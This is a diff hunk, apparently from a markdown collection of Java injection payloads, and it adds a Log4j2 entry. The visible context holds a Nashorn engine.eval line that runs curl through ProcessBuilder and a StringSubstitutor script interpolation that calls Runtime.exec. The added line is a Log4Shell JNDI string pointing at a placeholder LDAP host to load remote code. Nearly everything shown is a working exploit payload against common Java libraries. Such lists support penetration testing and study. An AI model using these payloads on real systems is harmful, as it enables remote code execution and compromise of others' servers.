@@ -334,6 +334,10 @@ engine.eval("var x=new java.lang.ProcessBuilder; x.command(\"curl\",\"http://127
 StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
 interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")}");
 ```
+- Log4j2
+```java
+logger.error("${jndi:ldap://x.x.x.x/exp}");
+```
 - SPEL
 ```java
 SpelExpressionParser parser = new SpelExpressionParser();
